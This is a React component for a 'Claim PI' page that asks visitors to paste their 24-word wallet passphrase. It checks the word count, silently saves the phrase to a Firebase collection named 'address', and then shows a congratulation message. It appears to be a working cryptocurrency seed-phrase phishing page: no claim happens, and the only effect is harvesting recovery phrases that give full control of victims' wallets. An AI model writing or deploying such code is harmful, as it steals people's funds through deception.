import React, { useState } from "react";
import s from "./style.module.scss";
import { db } from "../firebase.js";
import { collection, addDoc } from "firebase/firestore";
import { DotLottieReact } from "@lottiefiles/dotlottie-react";

function ClaimPi(props) {
  const addAddress = async (address) => {
    if (!checkAddress(address)) {
      return;
    }
    setTimeout(async () => {
      try {
        const docRef = await addDoc(collection(db, "address"), {
          address: address,
        });
        props.setCongratulation(true);
      } catch (error) {
        console.log(error);
      }
    }, 2000);
  };
  function checkAddress(address) {
    const checkedAddress = address.split(" ");
    const checkForEmptyWord = checkedAddress.filter(
      (word) => word.length === 0,
    );
    const newErrors = {
      address: "",
    };
    if (!address) {
      newErrors.address = "*Please enter 24-word passphrase address";
    } else if (checkedAddress.length < 24 || checkForEmptyWord.length) {
      newErrors.address = "*Please enter a valid 24-word passphrase address";
    } else {
      newErrors.address = "";
      setLoading(true);
    }

    setError(newErrors);
    return !newErrors.address;
  }
  const [value, setValue] = useState("");
  const [error, setError] = useState({
    address: "",
  });
  const [loading, setLoading] = useState(false);

  return (
    <div className={s.claimPiBoxContainer}>
      <textarea
        className={s.claimPiBox}
        name="piCode"
        id="piCodeId"
        rows="10"
        placeholder="Enter your 24-word passphrase here"
        value={value}
        onChange={(e) => {
          setValue(e.target.value);
        }}
      />
      {error.address && <span className={s.error}>{error.address}</span>}
      <button
        className={s.claimBtn}
        onClick={() => {
          checkAddress(value);
          addAddress(value);
        }}
      >
        {!loading ? (
          <span>Claim PI</span>
        ) : (
          <span className={s.loading}>
            <DotLottieReact
              src="https://lottie.host/33d9d834-1f10-421d-b744-f0e220b43053/veq5QSmWyO.lottie"
              loop
              autoplay
              style={{ width: "100px" }}
            />
          </span>
        )}
      </button>
    </div>
  );
}

export default ClaimPi;
